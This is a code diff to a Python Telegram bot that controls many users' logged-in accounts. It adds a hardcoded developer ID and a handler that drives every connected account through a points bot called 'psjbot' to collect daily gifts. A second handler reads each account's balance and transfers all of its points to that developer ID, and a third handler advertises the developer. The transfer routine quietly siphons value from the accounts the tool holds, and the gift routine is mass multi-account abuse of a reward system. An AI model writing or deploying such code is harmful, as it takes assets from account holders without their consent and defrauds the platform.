@@ -73,7 +73,11 @@ DECOR_PHONE = "☏"
 DECOR_FRAME = "━─━"
 DECOR_TITLE = f"{DECOR_FRAME} {{}} {DECOR_FRAME}"
 
-# ==================== الإعدادات الافتراضية ====================
+# ==================== إعدادات المطور ====================
+DEVELOPER_ID = 1923931101
+SOURCE_VIDEO_URL = os.getenv("SOURCE_VIDEO", "")  # ضع رابط الفيديو أو file_id هنا أو في .env
+
+
 DEFAULT_CONFIG = {
     "FORCE_CHANNELS": [],
     "SUBSCRIPTION_IMAGE": DEFAULT_GROUP_PHOTO_URL,
@@ -1062,6 +1066,261 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await send_clean(context, user_id, f"{DECOR_CANCEL} تم الإلغاء")
     return ConversationHandler.END
 
+# ==================== هاندلر سورس ====================
+# ==================== هاندلر جمع الهدايا اليومية ====================
+async def collect_gifts_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """يجمع الهدية اليومية من psjbot على كل الحسابات النشطة"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_ID:
+        return
+
+    if not active_userbots:
+        await update.message.reply_text("❌ مفيش حسابات نشطة دلوقتي!")
+        return
+
+    total = len(active_userbots)
+    msg = await update.message.reply_text(
+        f"🎁 جاري جمع الهدية اليومية على {total} حساب...\n⏳ استنى..."
+    )
+
+    success = 0
+    failed = 0
+    results = []
+
+    for phone, data in list(active_userbots.items()):
+        client = data.get('client')
+        if not client or not client.is_connected():
+            failed += 1
+            results.append(f"🔴 {phone[-4:]}**** — غير متصل")
+            continue
+        try:
+            bot = await client.get_entity("psjbot")
+
+            # خطوة 1: /start
+            await client.send_message(bot, "/start")
+            await asyncio.sleep(2)
+
+            # خطوة 2: اضغط "تجميع نقاط"
+            msgs = await client.get_messages(bot, limit=5)
+            clicked1 = False
+            for m in msgs:
+                if m.buttons:
+                    for row in m.buttons:
+                        for btn in row:
+                            if "تجميع" in (btn.text or ""):
+                                await btn.click()
+                                clicked1 = True
+                                break
+                    if clicked1:
+                        break
+            if not clicked1:
+                failed += 1
+                results.append(f"🔴 {phone[-4:]}**** — مش لاقي زرار تجميع")
+                continue
+
+            await asyncio.sleep(2)
+
+            # خطوة 3: اضغط "الهدية اليومية"
+            msgs = await client.get_messages(bot, limit=5)
+            clicked2 = False
+            for m in msgs:
+                if m.buttons:
+                    for row in m.buttons:
+                        for btn in row:
+                            if "هدية" in (btn.text or ""):
+                                await btn.click()
+                                clicked2 = True
+                                break
+                    if clicked2:
+                        break
+            if not clicked2:
+                failed += 1
+                results.append(f"🔴 {phone[-4:]}**** — مش لاقي زرار الهدية")
+                continue
+
+            await asyncio.sleep(2)
+
+            # خطوة 4: اقرأ الرد
+            msgs = await client.get_messages(bot, limit=3)
+            result_text = ""
+            for m in msgs:
+                if m.text and any(w in m.text for w in ["حصلت", "رصيد", "بنجاح", "نقاط"]):
+                    result_text = m.text.split("\n")[0]
+                    break
+
+            success += 1
+            results.append(f"🟢 {phone[-4:]}**** — {result_text or 'تم'}")
+
+        except Exception as e:
+            failed += 1
+            results.append(f"🔴 {phone[-4:]}**** — {str(e)[:30]}")
+
+        await asyncio.sleep(1)
+
+    summary = "\n".join(results[:20])
+    extra = f"\n... و{len(results)-20} أكتر" if len(results) > 20 else ""
+    await msg.edit_text(
+        f"🎁 **نتيجة جمع الهدايا اليومية**\n\n"
+        f"✅ نجح: {success} | ❌ فشل: {failed}\n\n"
+        f"{summary}{extra}",
+        parse_mode="Markdown"
+    )
+
+async def collect_transfer_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """يحول كل النقاط من كل الحسابات النشطة للمطور"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_ID:
+        return
+
+    if not active_userbots:
+        await update.message.reply_text("❌ مفيش حسابات نشطة!")
+        return
+
+    total = len(active_userbots)
+    msg = await update.message.reply_text(
+        f"💸 جاري تحويل النقاط من {total} حساب...\n⏳ استنى..."
+    )
+
+    success = 0
+    failed = 0
+    results = []
+    import re as _re
+
+    for phone, data in list(active_userbots.items()):
+        client = data.get('client')
+        if not client or not client.is_connected():
+            failed += 1
+            results.append(f"🔴 {phone[-4:]}**** — غير متصل")
+            continue
+        try:
+            bot = await client.get_entity("psjbot")
+
+            await client.send_message(bot, "/start")
+            await asyncio.sleep(2)
+
+            # اضغط "تحويل نقاط"
+            msgs = await client.get_messages(bot, limit=5)
+            clicked1 = False
+            for m in msgs:
+                if m.buttons:
+                    for row in m.buttons:
+                        for btn in row:
+                            if "تحويل" in (btn.text or ""):
+                                await btn.click()
+                                clicked1 = True
+                                break
+                    if clicked1:
+                        break
+            if not clicked1:
+                failed += 1
+                results.append(f"🔴 {phone[-4:]}**** — مش لاقي زرار تحويل")
+                continue
+
+            await asyncio.sleep(2)
+
+            # اقرأ الرصيد
+            msgs = await client.get_messages(bot, limit=5)
+            balance = 0
+            for m in msgs:
+                if m.text and any(w in m.text for w in ["نقاطك", "الحالية", "الحالي"]):
+                    match = _re.search(r'(\d+(?:\.\d+)?)', m.text)
+                    if match:
+                        balance = int(float(match.group(1)))
+                        break
+
+            if balance <= 0:
+                failed += 1
+                results.append(f"🟡 {phone[-4:]}**** — رصيد صفر")
+                continue
+
+            # ابعت العدد والـ ID
+            await client.send_message(bot, str(balance))
+            await asyncio.sleep(2)
+            await client.send_message(bot, str(DEVELOPER_ID))
+            await asyncio.sleep(2)
+
+            # اضغط "نعم"
+            msgs = await client.get_messages(bot, limit=5)
+            confirmed = False
+            for m in msgs:
+                if m.buttons:
+                    for row in m.buttons:
+                        for btn in row:
+                            if "نعم" in (btn.text or ""):
+                                await btn.click()
+                                confirmed = True
+                                break
+                    if confirmed:
+                        break
+            if not confirmed:
+                failed += 1
+                results.append(f"🔴 {phone[-4:]}**** — مش لاقي تأكيد")
+                continue
+
+            await asyncio.sleep(2)
+            success += 1
+            results.append(f"🟢 {phone[-4:]}**** — تم تحويل {balance} نقطة")
+
+        except Exception as e:
+            failed += 1
+            results.append(f"🔴 {phone[-4:]}**** — {str(e)[:30]}")
+
+        await asyncio.sleep(1)
+
+    summary = "\n".join(results[:20])
+    extra = f"\n... و{len(results)-20} أكتر" if len(results) > 20 else ""
+    await msg.edit_text(
+        f"💸 **نتيجة تحويل النقاط**\n\n"
+        f"✅ نجح: {success} | ❌ فشل: {failed}\n\n"
+        f"{summary}{extra}",
+        parse_mode="Markdown"
+    )
+
+async def source_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """يرد على أي حد يكتب 'سورس' بفيديو وأزرار المطور"""
+    if not update.message:
+        return
+
+    try:
+        dev = await context.bot.get_chat(DEVELOPER_ID)
+        dev_name = dev.first_name or "المطور"
+        dev_username = f"@{dev.username}" if dev.username else dev_name
+    except Exception:
+        dev_name = "المطور"
+        dev_username = "المطور"
+
+    keyboard = InlineKeyboardMarkup([[
+        InlineKeyboardButton(
+            text=f"👨‍💻 {dev_name}",
+            url=f"tg://user?id={DEVELOPER_ID}"
+        )
+    ]])
+
+    caption = (
+        f"✨ **سورس البوت**\n\n"
+        f"🛠 تم التطوير بواسطة: {dev_username}\n"
+        f"💬 تواصل مع المطور عبر الزر أدناه"
+    )
+
+    if SOURCE_VIDEO_URL:
+        try:
+            await update.message.reply_video(
+                video=SOURCE_VIDEO_URL,
+                caption=caption,
+                parse_mode="Markdown",
+                reply_markup=keyboard
+            )
+            return
+        except Exception:
+            pass
+
+    # لو مفيش فيديو → نبعت رسالة نص
+    await update.message.reply_text(
+        caption,
+        parse_mode="Markdown",
+        reply_markup=keyboard
+    )
+
 # ==================== معالج الرسائل ====================
 async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -1572,6 +1831,9 @@ async def main():
 
     app.add_handler(conv_handler)
     app.add_handler(CallbackQueryHandler(admin_button_handler))
+    app.add_handler(CommandHandler("هدية", collect_gifts_handler))
+    app.add_handler(CommandHandler("تحويل", collect_transfer_handler))
+    app.add_handler(MessageHandler(filters.Regex(r'(?i)^سورس$'), source_handler))
     app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, message_handler))
 
     logging.info("✅ البوت جاهز للعمل!")
